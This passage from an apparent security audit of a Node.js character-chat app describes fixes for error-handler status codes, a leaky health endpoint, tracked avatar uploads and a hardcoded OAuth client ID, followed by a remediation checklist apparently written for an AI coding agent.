   - Both `server.js:240` (`const statusCode = error.status || error.code || 500; res.status(statusCode)`) and `BaseController.js:52` (`const statusCode = error.statusCode || error.code || 500;`) pass `error.code` directly to `res.status()`.
   - Native Node.js, LibSQL, and SQLite errors set string codes such as `error.code = 'SQLITE_CONSTRAINT'`, `'ECONNREFUSED'`, or `'ERR_INVALID_URL'`. In Express 5, `res.status('SQLITE_CONSTRAINT')` throws an unhandled `RangeError: Invalid status code`!
   - Also `server.js:243` returns raw `error.message` to clients even on `500` internal errors.
2. **Verbose Infrastructure Telemetry on Public `/api/health` (`server.js:94-106`)**:
   - `GET /api/health` publicly discloses `sqlStats.engine` (which in `backend/db/database.js:187` contains the live `TURSO_DATABASE_URL` or full Windows host filesystem path `C:\Users\...`), exact LLM model identifiers, `gemini_available`, and exact table row counts for users, characters, sessions, and memories.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-14-error-handler-and-health.test.js` verifying `BaseController.handleError` safely maps string `error.code = 'SQLITE_CONSTRAINT'` to HTTP `500` with a generic error message, and `/api/health` does not leak `libsql://` URLs or filesystem paths.
- [ ] **Step 2**: Sanitize `statusCode` in `backend/controllers/BaseController.js:51-65` and `server.js:238-246`:
```javascript
// In BaseController.handleError(res, error, context = ''):
  handleError(res, error, context = '') {
    const rawCode = error?.statusCode ?? error?.status ?? error?.code;
    const statusCode =
      typeof rawCode === 'number' && Number.isInteger(rawCode) && rawCode >= 400 && rawCode <= 599
        ? rawCode
        : 500;

    if (statusCode >= 500) {
      console.error(`[ERROR] ${context}:`, error);
    }

    const safeMessage =
      statusCode >= 500
        ? 'Internal server error'
        : (error?.message || 'Request failed');

    return res.status(statusCode).json({
      error: {
        message: safeMessage,
        code: statusCode,
        ...(error?.field ? { field: error.field } : {}),
        timestamp: new Date().toISOString()
      }
    });
  }
```
  Apply the same numeric `statusCode` guard and `statusCode >= 500 ? 'Internal server error' : error.message` masking in `server.js:238-246`.
- [ ] **Step 3**: Redact `sqlStats.engine` in `GET /api/health` (`server.js:94-106`) so `database` only reports `'turso'` or `'sqlite'` (keeping `status: 'ok'`, `database`, and `stats` keys intact so `tests/api.test.js:41` continues passing!).

---

### [VULN-15] Repository Hygiene: User-Uploaded Avatars Tracked in Git & Hardcoded OAuth Client ID Fallback
- **Severity**: **LOW** (Informational / Policy Violation)
- **Location**:
  - `.gitignore` & `nextjs-frontend/.gitignore`
  - `nextjs-frontend/public/assets/avatars/avatar_*` (19 files)
  - `backend/config/index.js:25`

#### What Was Found
1. **User-Uploaded Media Committed to Git**: `.gitignore` ignores `frontend/assets/avatars/avatar_*`, **but** `19` uploaded `avatar_*.png` / `avatar_*.jpg` files are currently tracked in Git inside `nextjs-frontend/public/assets/avatars/` (violating `.agents/rules/project_workflow.md`: *"Never commit `.env`, SQLite binaries (`.sqlite`), private tokens, or user-uploaded media files to Git"*).
2. **Hardcoded Personal Google Client ID**: `backend/config/index.js:25` hardcodes `'222481482831-ebqtrbbps2s78b7h89a2at9q83g6rbs1.apps.googleusercontent.com'` as a fallback when `process.env.GOOGLE_CLIENT_ID` is unset. If deployed by another environment without setting `GOOGLE_CLIENT_ID`, tokens minted for that external Google project would pass audience checks.

#### How to Fix
- [ ] **Step 1**: Add `nextjs-frontend/public/assets/avatars/avatar_*` to root `.gitignore` (and `public/assets/avatars/avatar_*` to `nextjs-frontend/.gitignore`), and untrack the 19 uploaded files from Git index while keeping canon character portraits (`frieren.png`, `kana-arima.png`, `robin.png`, `satoru-gojo.png`, `sherlock-holmes.jpg`, `son-goku.jpg`, `math-teacher.jpg`, `.gitkeep`):
  ```bash
  git rm --cached nextjs-frontend/public/assets/avatars/avatar_*
  ```
- [ ] **Step 2**: Change `GOOGLE_CLIENT_ID` in `backend/config/index.js:25` to `process.env.GOOGLE_CLIENT_ID || ''` and store the actual client ID in `.env` / `.env.example`.

---

## Quick-Start Execution Checklist for Gemini 3.8 Flash

- [ ] **Batch 1 — Critical Auth & File Upload Fixes**:
  - [ ] Fix `[VULN-01]` (`backend/services/auth.service.js`, `tests/api.test.js` #18) + add `tests/vuln-01-social-auth-bypass.test.js`
  - [ ] Fix `[VULN-02]` (`backend/config/index.js`, `backend/controllers/auth.controller.js`, `backend/services/email.service.js`, `backend/services/auth.service.js`, `frontend/js/reset-password.js`) + add `tests/vuln-02-password-reset-security.test.js`
  - [ ] Fix `[VULN-03]` (`backend/middlewares/security.js`, `backend/routes/auth.route.js`, `backend/routes/index.js`, `backend/services/auth.service.js`, `server.js`, `tests/api.test.js` #21) + add `tests/vuln-03-avatar-upload-xss.test.js`
  - [ ] Run `npm test` -> verify exit code `0`.

- [ ] **Batch 2 — High Access Control, XSS & SSRF Fixes**:
  - [ ] Fix `[VULN-04]` (`server.js` admin path normalization) + add `tests/vuln-04-admin-gatekeeper-bypass.test.js`
  - [ ] Fix `[VULN-05]` (`backend/services/memory.service.js`, `backend/controllers/memory.controller.js`) + add `tests/vuln-05-memory-isolation.test.js`
  - [ ] Fix `[VULN-06]` (`frontend/js/common.js`, `frontend/js/auth-page.js`, `frontend/js/profile-setup-page.js`, `frontend/js/chat.js`, `nextjs-frontend/components/layout/sidebar.tsx`, `backend/controllers/character.controller.js`, `backend/middlewares/security.js`) + add `tests/vuln-06-xss-and-redirect.test.js`
  - [ ] Fix `[VULN-07]` (`backend/models/Character.js`, `backend/services/auth.service.js`, `nextjs-frontend/components/profile/profile-editor.tsx`) + add `tests/vuln-07-character-ownership-hijack.test.js`
  - [ ] Fix `[VULN-08]` (`backend/config/index.js`, `backend/services/wiki.service.js`) + add `tests/vuln-08-wiki-ssrf-redirect.test.js`
  - [ ] Fix `[VULN-09]` (`backend/controllers/persona.controller.js`, `backend/controllers/character.controller.js`, `backend/repositories/CharacterRepository.js`) + add `tests/vuln-09-access-control-and-quota.test.js`
  - [ ] Run `npm test` -> verify exit code `0`.

- [ ] **Batch 3 — Medium/Low Hardening, Dependencies & Repo Hygiene**:
  - [ ] Fix `[VULN-10]` (`backend/middlewares/auth.js`, `nextjs-frontend/lib/auth.ts`, `backend/services/auth.service.js`, `backend/controllers/auth.controller.js`, `frontend/js/api.js`, `server.js`) + add `tests/vuln-10-jwt-and-cookie-hardening.test.js`
  - [ ] Fix `[VULN-11]` (`server.js`, `backend/middlewares/security.js`) + add `tests/vuln-11-ratelimiter-hardening.test.js`
  - [ ] Fix `[VULN-12]` (`backend/models/UserPersona.js`, `backend/models/User.js`, `backend/models/CharacterMemory.js`, `backend/models/ChatSession.js`, `backend/repositories/PersonaRepository.js`) + add `tests/vuln-12-csprng-model-ids.test.js`
  - [ ] Fix `[VULN-13]` (`npm audit fix` in root + upgrade `next` in `nextjs-frontend/package.json`)
  - [ ] Fix `[VULN-14]` (`backend/controllers/BaseController.js`, `server.js`) + add `tests/vuln-14-error-handler-and-health.test.js`
  - [ ] Fix `[VULN-15]` (`.gitignore`, `git rm --cached nextjs-frontend/public/assets/avatars/avatar_*`, `backend/config/index.js`)
  - [ ] Wire new `tests/vuln-*.test.js` into `package.json` `"test"` script (or run all via `npm test`), run `graphify update .`, run `npm run audit:pack`, update `PROGRESS.md`, and push to `origin main`.
